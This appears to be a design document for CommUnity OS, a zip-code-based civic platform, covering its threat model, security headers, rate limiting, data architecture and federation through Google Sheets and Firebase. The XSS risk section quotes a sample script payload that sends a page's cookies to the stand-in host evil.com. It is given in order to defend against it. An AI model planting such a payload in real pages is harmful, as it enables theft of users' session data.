Why This Exists ▼

The One Big Beautiful Bill Act (signed July 4, 2025) enacted the largest cuts to American safety net programs in history: $1 trillion from Medicaid, up to $187 billion from SNAP. Over 8,000 federal web pages and 3,000+ datasets have been removed or altered. The USDA eliminated its own 30-year hunger survey so no one can measure what happens next.

No civic technology platform bridges the gap from crisis survival to community governance. Every existing platform — Findhelp, 211, mRelief, Code for America, Decidim, Loomio, Mutual Aid Hub — occupies one segment. Nobody connects them. CommUnity OS does. And the research confirms no one else has built it.

What CommUnity OS Is ▼

A free bilingual civic resilience platform. 22 pages. Static HTML + Google Apps Script + Google Sheets + Firebase read cache. $7/year to operate. One zip code entry. No account. No email. No tracking. Everything runs on a single reasoning scaffold: Normal → Broken → Fix.

The platform is not a website. It is a nervous system for civic resilience. One person enters a zip code. That is the seed. From that single input, they see what's available near them, what they need to know, who's nearby, and how their community is doing. When a second person enters the same zip, a community forms. When communities connect through the federated data chain, a national picture emerges — bottom-up, for the first time.

Security Architecture NEW CRITICAL ▼

Threat Model

CommUnity OS has no user accounts, no passwords, no cookies, no sessions. This eliminates entire classes of attack (session hijacking, credential stuffing, brute force login). But the accountless model introduces its own risks:

1. Cross-Site Scripting (XSS)

Risk: User-submitted content (discussion posts, needs, evaluation notes) rendered as HTML could inject malicious scripts. An attacker posts <script>document.location='evil.com?c='+document.cookie</script> in a discussion.

Current mitigation: esc() function in discuss.html replaces < and > with HTML entities on every render. sanitize() in Code.gs strips HTML server-side.

Enhancement: Add Content Security Policy header via Netlify _headers file. CSP prevents inline script execution even if escaping fails.

Netlify _headers file:
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' https://*.firebaseio.com https://script.google.com https://*.googleapis.com https://fonts.googleapis.com https://phzmapi.org; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://*.openStax.org; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(self), microphone=(), geolocation=()

2. Cross-Site Request Forgery (CSRF)

Risk: Attacker tricks a user into submitting a POST to Apps Script (e.g., posting a discussion, submitting an evaluation) from a malicious site.

Current mitigation: Apps Script requires Content-Type: text/plain to avoid CORS preflight. No cookies or sessions to hijack.

Enhancement: Add Sec-Fetch-Site header validation in Code.gs. Check referrer origin. Rate limit by IP (Apps Script can read e.parameter.ip in some contexts) or by display_name + zip + time window.

3. Abuse / Spam

Risk: Someone scripts 10,000 discussion posts. Or a bot floods the evaluation system with fake scores.

Current mitigation: propose.html has client-side rate limiting (3/day). Vote dedup via localStorage.

Enhancement: Server-side rate limiting in Code.gs using CacheService as a rate limiter:

function rateLimitCheck(key, maxPerHour) {
  var cache = CacheService.getScriptCache();
  var count = parseInt(cache.get('rl_' + key) || '0');
  if (count >= maxPerHour) return false;
  cache.put('rl_' + key, String(count + 1), 3600);
  return true;
}

// Usage in postDiscussion:
var rlKey = payload.zip + '_' + payload.display_name;
if (!rateLimitCheck(rlKey, 20)) {
  return jsonResp({status:'error', message:'Rate limit exceeded'});
}

4. Firebase Data Exposure

Risk: Firebase URL discovered → bulk download of all community data.

Mitigation (in spec): Data structured by zip: /discussions/60608/D-123. Security rules: .read: true scoped to $zip children. .write: false on all collections. No bulk download of root collection possible.

Enhancement: Firebase App Check (free) adds device attestation. Requests without valid App Check tokens are rejected. Works with reCAPTCHA v3 (invisible, no user friction).

5. Google Sheet Data Integrity

Risk: Someone with Sheet access modifies historical records.

Mitigation: SHA-256 integrity hash on every submission, returned to user as receipt. WriteLog tab tracks every operation. Version history in Google Sheets preserves every change. Data Steward audit trail.

6. Health Data Privacy (HIPAA-adjacent)

Risk: Community Health Pulse data, even anonymized, could theoretically be de-identified.

Mitigation: 3-digit ZIP prefix (populations >20,000). Age ranges, not exact ages. Year-month, not exact dates. k≥11 suppression (exceeds EMA and Health Canada standards). No name, email, IP, or device fingerprint collected. Random sub_id prevents duplicate counting but cannot be traced to a person. HIPAA does not apply (non-covered entity), but Safe Harbor methodology adopted voluntarily.

Data Architecture (v30) ▼

The Three-Component Pattern

Firebase is the cache. Google Sheet is the truth. The cache is rebuildable from the truth.

Browser
  ├── READ  → Firebase (fast, indexed, real-time)
  │            └── if down → sessionStorage cache
  │                 └── if empty → Apps Script → Sheet
  └── WRITE → Apps Script (validates + sanitizes)
                ├── 1st: Write to Firebase
                ├── 2nd: Mirror to Sheet (sovereign audit copy)
                ├── 3rd: Log to WriteLog tab
                └── Return response

Write Rules

Firebase: .write: false on all collections. Browser cannot write directly. All writes through Apps Script. Write succeeds if EITHER Firebase or Sheet succeeds. Daily reconciliation repairs drift. WriteLog tracks every operation.

Performance Optimization (from research)

Immediate wins (no migration required):
• CacheService: 1,000 items, 100KB each, 6hr TTL. Cache-first reads cut SpreadsheetApp calls by 80%.
• Batch reads: Single getDataRange().getValues() for 10K rows = 20x faster than individual getValue() calls.
• IndexedDB client cache: Replace sessionStorage with idb-keyval (600 bytes from CDN). Persists across sessions. 70% reduction in server reads for returning users.
• Sheets API v4: 35% faster reads, 19% faster writes than SpreadsheetApp.
• UrlFetchApp.fetchAll(): 10 sequential fetches → 1 parallel batch. 10x faster writes to Firebase.

Federated Infrastructure NEW ▼

Federation Model: Civic Mesh, Not ActivityPub

ActivityPub (Mastodon, PeerTube) assumes individual users on separate instances who follow each other. CommUnity OS assumes communities organized by geography who share summary data upward. The federation model is closer to how public health data flows (local → county → state → national) than how social media federates.

Why not ActivityPub: ActivityPub requires server-to-server communication with inboxes/outboxes, content addressing, and user identity management. CommUnity OS communities don't "follow" each other — they share summary metrics through a standardized schema. The IMPORTRANGE chain is simpler, cheaper ($0), and community-inspectable. ActivityPub is protocol-level complexity for a problem that spreadsheet formulas solve.

Three Federation Layers

Layer 1: IMPORTRANGE Chain (audit-grade, hourly)

Every level is a Google Sheet with a standardized Summary tab (32 columns). The level above uses =IMPORTRANGE() to pull Summary rows. No code required. No server. No API keys.

Community (60608) ─┐
Community (60609) ─┼─→ Ward (Ward 25) ─┐
Community (60632) ─┘                    ├─→ City → County → State → National
Community (60623) ─┐                    │
Community (60629) ─┼─→ Ward (Ward 12) ─┘

Rules: Counts SUM up. Averages AVERAGE up. Pressure scores AVERAGE up. Same schema at every level. ~50 IMPORTRANGE calls per Sheet. Cities with 50+ wards add a district level.

Layer 2: Firebase Cross-Zip (real-time, instant)

Each community's Firebase project queryable by zip prefix. Registry maps zip → Firebase URL. Cross-zip reads are millisecond REST queries.

// Nearby discussions for entire 606xx area
var url = FB + '/discussions.json?orderBy="zip"&startAt="60600"&endAt="60699"&limitToLast=20';

Layer 3: Federation Handshake Protocol

How a new community joins:

1. Create Sheet + deploy Apps Script from template
2. POST register_community to hub (zip, state, script_url, steward_name)
3. Hub validates, pings endpoint, assigns community_id
4. Set MASTER_URL and COMMUNITY_ID in Script Properties
5. CommunityReporter.gs sends first weekly report (counts only, no personal data)
6. Community appears in registry lookups and aggregations

Revocation: Change Sheet sharing settings. Immediate. Complete. No approval. Community retains all data. Hub retains nothing.

Research Context: Federated Civic Networks

The Bertelsmann Stiftung (2025) identified federated infrastructure as critical for digital sovereignty and civic participation. The Fediverse (Mastodon, etc.) demonstrates that federated systems can achieve meaningful scale — but also that user experience and complexity remain barriers to adoption. CommUnity OS addresses this by making federation invisible: the user enters a zip code, not an instance URL. The federation happens at the data layer, not the identity layer.

Key insight from decentralized network research: "Federated architectures generally offer profile portability, meaning users can migrate between instances while retaining their social connections." CommUnity OS achieves this architecturally — a community's data is portable because it lives in their Google Sheet, not in the platform.
